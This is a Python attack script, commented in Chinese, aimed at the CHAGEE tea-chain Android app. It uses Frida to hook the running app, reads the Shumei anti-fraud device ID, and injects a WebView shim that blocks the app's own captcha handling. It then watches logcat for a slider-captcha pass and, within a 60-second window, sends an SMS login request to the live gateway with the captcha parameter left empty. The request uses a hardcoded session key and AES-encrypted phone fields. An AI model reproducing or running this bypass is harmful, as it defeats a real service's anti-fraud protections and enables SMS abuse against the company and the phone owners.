#!/usr/bin/env python3
"""slider_window_pipeline — 滑块 PASS 60s 信任窗口内协议抢发（E5 未穷举项）。

依据（并行会话 E5 实证）：
  - 滑块 VerifyCaptchaV3 PASS 后 60s 窗口内 APP 重发有效（实证10）
  - pass 样本 captchaParam 为空（实证1）→ 窗口内 param 非必要
  - sign/smSessionId 不承载信任；deviceId = 'B'+数美serverId 是判决维度之一
  - 4 配方重放全在窗口外 → 全 challenge

本脚本：frida 取当前 App 数美 deviceId + 注入阻断 shim（防 App 消费窗口）
  → 监控 logcat "success captchaVerifyParam"（PASS 瞬间）
  → <3s 内以 flow41 完整形态协议发 message/send（captchaParam 空）
用法：python slider_window_pipeline.py <phone> [分钟]
"""
import base64
import json
import os
import re
import subprocess
import sys
import threading
import time

import frida
import requests
try:
    from Crypto.Cipher import AES
except ImportError:
    from Cryptodome.Cipher import AES

ADB = r"C:\platform-tools\adb.exe"
DEV = os.environ.get("CLOUDPHONE_SERIAL", "125.109.27.7:58445")
SK_RAW = "f7346022c2d57c81"          # APP 会话 sk（抓包缓存，实证不承载信任）
SID = "e55a9fa2-0c9c-483d-bc5a-db9017383749e"
URL = "https://gw.chagee.com/user-client/message/send"

HEADERS = {
    "ua": "Dart/2.12 (dart:io)", "user-agent": "Dart/3.8 (dart:io)",
    "patchversion": "", "avc": "2060", "tcode": "CHAGEE",
    "accept-encoding": "gzip", "channel": "APP",
    "uuid": "029a1add-a99d-5fc5-a6bc-d046755108d3", "os": "android",
    "aid": "100001", "content-type": "application/json",
    "devicetimezoneregion": "Asia/Shanghai", "language": "zh_CN",
    "apv": "1.0.3", "region": "CN", "host": "gw.chagee.com",
    "sk": base64.b64encode(SK_RAW.encode()).decode(),
    "cid": "029a1add-a99d-5fc5-a6bc-d046755108d3",
}

BLOCK_JS = ("(function(){if(window.__blk)return 'd';window.__blk=1;"
 "window.ChageeCall={postMessage:function(m){try{console.log('BLOCKED');}catch(e){}}};"
 "if(window.flutter_inappwebview&&window.flutter_inappwebview.callHandler){"
 "var o=window.flutter_inappwebview.callHandler;"
 "window.flutter_inappwebview.callHandler=function(n,m){"
 "if(m&&String(m).indexOf('captchaVerify')>=0){console.log('BLOCKED_H');return;}"
 "return o.apply(this,arguments);};}"
 "console.log('BLOCKSHIM_ON');return 'on';})()")

TOKEN_RE = re.compile(r"success captchaVerifyParam: (eyJ[A-Za-z0-9+/=]+)")
state = {"device_id": None, "token": None, "fired": False}


def enc_field(plain: str) -> str:
    pad = 16 - len(plain.encode()) % 16
    data = plain.encode() + bytes([pad]) * pad
    return base64.b64encode(AES.new(SK_RAW.encode(), AES.MODE_ECB).encrypt(data)).decode()


def fire(phone: str):
    """窗口内抢发：flow41 完整形态，captchaParam 空。"""
    body = {
        "scene": "login",
        "mobile": enc_field(phone),
        "sendObj": enc_field(phone),
        "phoneCode": "86",
        "blockParam": "不验证",
        "sid": SID,
        "timestamp": int(time.time() * 1000),
        "deviceId": state["device_id"] or "",
        "smSessionId": "",
        "captchaParam": "",
    }
    print(f"[fire] t+{time.time()-state.get('pass_ts', time.time()):.1f}s deviceId={state['device_id'][:30]}...", flush=True)
    r = requests.post(URL, headers=HEADERS, json=body, timeout=15)
    try:
        j = r.json()
        d = j.get("data") or {}
        flag, act = d.get("sendFlag"), (d.get("dispose") or {}).get("action")
        print(f"[fire] sendFlag={flag} action={act}", flush=True)
        if flag is True:
            print("*** 窗口内协议抢发成功：短信已真实投递！纯协议路线重开 ***", flush=True)
        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                               "..", "output", "cdp", "window_fire_result.json"), "w",
                  encoding="utf-8") as f:
            json.dump({"body": body, "resp": j}, f, ensure_ascii=False, indent=1)
    except Exception:
        print("[fire] 非JSON:", r.text[:300], flush=True)


def adb_logcat_tail(cb):
    """流式 logcat，命中 success 行回调。"""
    env = {"MSYS_NO_PATHCONV": "1", "PATH": "", "SYSTEMROOT": "C:\\Windows"}
    p = subprocess.Popen([ADB, "-s", DEV, "logcat", "-v", "time"],
                         stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, env=env,
                         bufsize=1, text=True, encoding="utf-8", errors="replace")
    for line in p.stdout:
        m = TOKEN_RE.search(line)
        if m:
            state["token"] = m.group(1)
            cb()


def main():
    phone = sys.argv[1]
    minutes = float(sys.argv[2]) if len(sys.argv) > 2 else 6

    dev = frida.get_device(DEV, timeout=10)
    pid = next(p.pid for p in dev.enumerate_processes()
               if p.name in ("霸王茶姬", "com.chagee.application.cn"))
    print(f"[win] attach {pid}", flush=True)
    s = dev.attach(pid)

    # 取数美 deviceId（当前进程身份）
    got_id = {"v": False}
    sc = s.create_script(r"""
    Java.perform(function(){
        try {
            var Sm = Java.use("com.ishumei.smantifraud.SmAntiFraud");
            var id = Sm.getDeviceId();
            send("[SM] " + id);
        } catch(e) { send("[SM-ERR] " + e); }
    });
    """)
    def on_sm(m, d):
        if m.get("type") == "send" and str(m.get("payload","")).startswith("[SM] "):
            raw = m["payload"][5:]
            # deviceId 字段形态：'B' + 64B serverId 的 b64；hook 返回已是 b64 串则加 B 前缀
            cand = raw if len(raw) == 89 and raw.startswith("B") else ("B" + raw)
            state["device_id"] = cand
            got_id["v"] = True
            print(f"[sm] deviceId = {cand[:40]}... len={len(cand)}", flush=True)
    sc.on("message", on_sm)
    sc.load()
    time.sleep(2)

    def on_pass():
        if state["fired"]:
            return
        state["fired"] = True
        state["pass_ts"] = time.time()
        print("[win] 滑块 PASS 检测到！抢发中...", flush=True)
        threading.Thread(target=fire, args=(phone,), daemon=True).start()

    threading.Thread(target=adb_logcat_tail, args=(on_pass,), daemon=True).start()
    print(f"[win] 监控就绪（{minutes} 分钟窗口）——请触发滑块并拖动", flush=True)

    deadline = time.time() + minutes * 60
    while time.time() < deadline:
        time.sleep(2)
        # 周期性补注入阻断 shim（页面重载后幂等）
        try:
            inj = ("Java.perform(function(){\n"
                   "var WV = Java.use('android.webkit.WebView');\n"
                   "var evalJs = WV.evaluateJavascript.overload('java.lang.String','android.webkit.ValueCallback');\n"
                   "var SRC = " + json.dumps(BLOCK_JS) + ";\n"
                   "Java.choose('android.webkit.WebView', {\n"
                   "  onMatch: function(wv){ Java.scheduleOnMainThread(function(){\n"
                   "    try{ evalJs.call(wv, SRC, null); }catch(e){}\n"
                   "  }); },\n"
                   "  onComplete: function(){} });\n"
                   "});\n")
            si = s.create_script(inj)
            si.on("message", lambda m, d: None)
            si.load()
        except Exception:
            pass
        if state["fired"] and time.time() - state.get("pass_ts", 0) > 15:
            break
    print("[win] 结束", flush=True)
    s.detach()


if __name__ == "__main__":
    main()
